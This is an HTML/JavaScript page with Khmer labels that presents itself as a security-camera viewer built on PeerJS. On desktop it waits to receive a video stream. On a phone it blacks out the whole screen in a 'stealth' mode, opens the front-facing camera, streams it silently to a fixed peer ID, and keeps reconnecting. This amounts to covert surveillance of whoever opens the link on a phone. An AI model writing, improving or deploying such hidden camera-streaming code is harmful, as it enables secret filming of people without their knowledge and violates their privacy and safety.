<!DOCTYPE html>
<html lang="km">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ប្រព័ន្ធកាមេរ៉ាសុវត្ថិភាព ជំនាន់ដោះសោភ្លឺច្បាស់</title>
    <script src="https://unpkg.com/peerjs@1.4.7/dist/peerjs.min.js"></script>
    <style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #16161a; color: #ffffff; text-align: center; margin: 0; padding: 20px; }
        .container { max-width: 700px; margin: 0 auto; background: #242629; padding: 25px; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.5); }
        video { width: 100%; max-width: 640px; background: #000; border-radius: 8px; margin-top: 15px; border: 2px solid #2ac767; display: none; }
        #status { color: #fffffe; font-weight: bold; margin: 15px 0; font-size: 20px; background: #333436; padding: 10px; border-radius: 6px; }
        
        /* ប៊ូតុងពិសេសសម្រាប់ចុចដោះសោលើកុំព្យូទ័រ */
        .btn-play { background: #2ac767; color: #16161a; border: none; padding: 15px 30px; font-size: 18px; font-weight: bold; border-radius: 6px; cursor: pointer; margin-top: 15px; width: 100%; box-shadow: 0 4px 10px rgba(42,199,103,0.3); }
        .btn-play:hover { background: #23a956; }

        /* ស្ទីលសម្រាប់ធ្វើឱ្យទូរសព្ទងងឹតឈឹង */
        .phone-stealth-mode { background: #000000 !important; }
        .phone-stealth-mode .container { display: none !important; }
    </style>
</head>
<body>

    <div id="pc-ui" class="container" style="display: none;">
        <h2>🖥️ ផ្ទាំងគ្រប់គ្រងកាមេរ៉ាសុវត្ថិភាព (កុំព្យូទ័រ)</h2>
        <div id="status">📡 រង់ចាំទូរសព្ទបាញ់វីដេអូមក...</div>
        
        <button id="unlock-btn" class="btn-play" onclick="unlockStream()">▶️ ចុចត្រង់នេះដើម្បីមើលវីដេអូ</button>
        
        <video id="view-video" autoplay playsinline muted></video>
    </div>

    <script>
        // 🛠️ ប្តូរលេខបន្ទប់ថ្មីចុងក្រោយ ដើម្បីដេញទិន្នន័យចាស់ដែលកកស្ទះចោល
        const LIVE_ROOM_ID = 'hino-security-camera-system-2026-final';
        
        const peerConfig = {
            config: {
                iceServers: [
                    { urls: 'stun:stun.l.google.com:19302' },
                    { urls: 'stun:stun1.l.google.com:19302' },
                    { urls: 'stun:stun2.l.google.com:19302' }
                ]
            }
        };
        
        let peer = null;
        let currentCall = null; 
        let localStream = null;

        window.onload = function() {
            const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);

            if (!isMobile) {
                document.getElementById('pc-ui').style.display = 'block';
                runAsPC();
            } else {
                document.body.classList.add('phone-stealth-mode');
                startCamera();
            }
        };

        // --- ផ្នែកកុំព្យូទ័រ ---
        function runAsPC() {
            if (peer) peer.destroy();
            peer = new Peer(LIVE_ROOM_ID, peerConfig);

            peer.on('call', (call) => {
                if (currentCall) {
                    call.answer();
                    setTimeout(() => { call.close(); }, 500);
                    return;
                }

                call.answer();
                currentCall = call; 
                
                document.getElementById('status').style.color = '#2ac767';
                document.getElementById('status').innerText = "✅ បានភ្ជាប់! សូមចុចប៊ូតុងបៃតងខាងក្រោមដើម្បីមើលរូបភាព";
                
                // 🛠️ ជួសជុលចំណុចងងឹត៖ ឱ្យផ្ទាំងវីដេអូបើកបង្ហាញខ្លួនរង់ចាំជាមុនភ្លាមៗ
                const video = document.getElementById('view-video');
                video.style.display = 'block';

                call.on('stream', (remoteStream) => {
                    video.srcObject = remoteStream;
                    
                    // ព្យាយាមឱ្យវីដេអូដើរស្វ័យប្រវត្តសាកមើល
                    video.play().catch(() => { 
                        console.log("រង់ចាំអ្នកប្រើប្រាស់ចុចប៊ូតុងដោះសោ");
                    });
                });

                call.on('close', () => {
                    document.getElementById('status').style.color = '#fffffe';
                    document.getElementById('status').innerText = "📭 ទូរសព្ទបានដាច់ការភ្ជាប់។ រង់ចាំម្តងទៀត...";
                    video.style.display = 'none';
                    video.srcObject = null;
                    currentCall = null; 
                    document.getElementById('unlock-btn').style.display = 'block';
                });
            });
        }

        // មុខងារចុចប៊ូតុង
        function unlockStream() {
            const video = document.getElementById('view-video');
            if (video.srcObject) {
                video.style.display = 'block';
                video.muted = true;
                
                video.play()
                .then(() => {
                    document.getElementById('status').innerText = "🎥 កំពុងបង្ហាញរូបភាពកាមេរ៉ាមុខផ្ទាល់...";
                    document.getElementById('unlock-btn').style.display = 'none';
                })
                .catch((err) => {
                    alert("សូមចុចប៊ូតុងបៃតងម្តងទៀតបាទ!");
                });
            } else {
                alert("ទូរសព្ទមិនទាន់បានភ្ជាប់មកទេ! សូមបើក Link លើទូរសព្ទសិនបាទ។");
            }
        }

        // --- ផ្នែកទូរសព្ទ ---
        function startCamera() {
            navigator.mediaDevices.getUserMedia({
                video: { facingMode: "user", width: 640, height: 480 },
                audio: false
            })
            .then((stream) => {
                localStream = stream;
                connectToPC();
            })
            .catch((err) => {
                console.error(err);
            });
        }

        function connectToPC() {
            if (peer) peer.destroy();
            peer = new Peer(peerConfig); 

            peer.on('open', (id) => {
                const call = peer.call(LIVE_ROOM_ID, localStream);
                if (call) {
                    currentCall = call;
                    call.on('close', () => {
                        currentCall = null;
                        setTimeout(connectToPC, 3000);
                    });
                }
            });

            peer.on('error', (err) => {
                setTimeout(connectToPC, 4000);
            });
        }
    </script>
</body>
</html>
